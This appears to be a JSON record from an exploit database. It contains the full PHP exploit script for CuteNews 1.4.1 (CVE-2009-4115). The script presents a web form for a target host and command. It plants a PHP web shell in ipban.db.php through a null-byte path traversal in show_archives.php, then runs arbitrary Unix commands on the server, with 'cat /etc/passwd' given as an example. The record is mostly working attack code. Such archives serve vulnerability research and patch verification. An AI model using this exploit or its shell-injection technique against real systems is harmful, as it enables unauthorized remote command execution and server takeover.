{
  "id": "1289",
  "title": "CuteNews 1.4.1 - Shell Injection / Remote Command Execution",
  "cve": "CVE-2009-4115",
  "vuln_type": "unknown",
  "code": "<?php\r\n#  ---cuten141_xpl.php                                      7.13 03/11/2005    #\r\n#                                                                              #\r\n#                  CuteNews 1.4.1  shell injection                             #\r\n#                              by rgod                                         #\r\n#                  site: http://rgod.altervista.org                            #\r\n#                                                                              #\r\n#  usage: launch form Apache, fill in requested fields, then go!               #\r\n#                                                                              #\r\n#  make these changes in php.ini if you have troubles                          #\r\n#  with this script:                                                           #\r\n#  allow_call_time_pass_reference = on                                         #\r\n#  register_globals = on                                                       #\r\n#                                                                              #\r\n#  mphhh, exploited this two times... really bored ;)                          #\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho'<head><title>CuteNews 1.4.1  remote   commands   execution  </title>  <meta\r\nhttp-equiv=\"Content-Type\"  content=\"text/html; charset=iso-8859-1\"> <style type=\r\n\"text/css\"> <!-- body,td,th {color:  #00FF00;} body {background-color: #000000;}\r\n.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }\r\n.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;\r\nfont-style: italic; } --> </style></head> <body> <p class=\"Stile6\"> CuteNews\r\n1 . 4 . 1  (possibly prior versions) remote commands execution</p><p class=\"Stil\r\ne6\">a script by rgod at <a href=\"http://rgod.altervista.org\"    target=\"_blank\">\r\nhttp://rgod.altervista.org</a></p><table width=\"84%\"><tr><td width=\"43%\"> <form\r\nname=\"form1\" method=\"post\"   action=\"'.$SERVER[PHP_SELF].'?path=value&host=\r\nvalue&port=value&command=value&proxy=value\"><p><input type=\"text\"   name=\"host\">\r\n<span class=\"Stile5\"> hostname (ex: www.sitename.com)  </span></p><p>     <input\r\ntype=\"text\" name=\"path\"><span class=\"Stile5\"> path (ex: /cute/ or just /)</span>\r\n</p><p><input type=\"text\"name=\"port\"><span class=\"Stile5\"> specify a port  other\r\nthan 80 ( default value ) </span> </p>  <p>  <input  type=\"text\" name=\"command\">\r\n<span  class=\"Stile5\"> a Unix command , example: ls -la  to list directories, ca\r\nt /etc/passwd to show passwd file </span></p><p><input type=\"text\" name=\"proxy\">\r\n<span class=\"Stile5\">  send exploit through an HTTP  proxy (ip:port) </span></p>\r\n<p>   <input   type=\"submit\" name=\"Submit\"  value=\"go!\"> </p></form> </td> </tr>\r\n</table>';\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>&nbsp;&nbsp;</td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>&nbsp&nbsp</td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n\t\t\t    }\r\necho \"</tr></table>\";\r\n}\r\n\r\n\r\nfunction sendpacket($packet)\r\n{\r\nglobal $proxy, $host, $port, $html;\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nif ($proxy=='')\r\n           {$ock=fsockopen(gethostbyname($host),$port);}\r\n             else\r\n           {\r\n     \t    $c = preg_match($proxy_regex,$proxy);\r\n            if (!$c) {echo 'Not a valid prozy...'; die; }\r\n            $parts=explode(':',$proxy);\r\n\t        echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t        $ock=fsockopen($parts[0],$parts[1]);\r\n\t        if (!$ock) { echo 'No response from proxy...'; die;}\r\n\t       }\r\nfputs($ock,$packet);\r\nif ($proxy=='')\r\n           {\r\n           $html='';\r\n           while (!feof($ock)) {$html.=fgets($ock);}\r\n           }\r\n     else\r\n           {\r\n           $html='';\r\n           while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))\r\n           {\r\n            $html.=fread($ock,1);\r\n           }\r\n           }\r\nfclose($ock);\r\necho nl2br(htmlentities($html));\r\n}\r\n\r\nif (($path<>'') and ($host<>'') and ($command<>''))\r\n{\r\n  if ($port=='') {$port=80;}\r\n  $port=intval(trim($port));\r\n  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\n  if ($proxy=='') { $p=$path; } else { $p=\"http://\".$host.\":\".$port.$path;}\r\n#STEP 1 -> Inject a shell in ipban.db.php...\r\n###############################################################################################\r\n$shell='<?php error_reporting(0); ini_set(\"max_execution_time\",0); system($_GET[cmd]); die;?>';\r\n$shell=urlencode($shell);\r\n#very nice ip to add to banlist... ;) no check fo ip address format, only a stripslashes\r\n###############################################################################################\r\n\r\n$packet=\"GET \".$p.\"show_archives.php?template=../inc/ipban.mdu%00&member_db[1]=1&action=add&add_ip=\".$shell.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet); //show the packet for debugging purposes\r\nsendpacket($packet);\r\n\r\n# STEP 2 -> Launch commands\r\necho '<br> If CuteNews 1.4.1 is unpatched and vulnerable, now you will see '.htmlentities($command).' output...<br>';\r\n$packet=\"GET \".$p.\"data/ipban.db.php?cmd=\".urlencode($command).\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet); //debugging...\r\nsendpacket($packet);\r\n}\r\nelse\r\n{echo 'fill in all requested fields...optionally specify a proxy...';}\r\n\r\n?>\r\n\r\n# milw0rm.com [2005-11-03]",
  "url": "https://www.exploit-db.com/exploits/1289"
}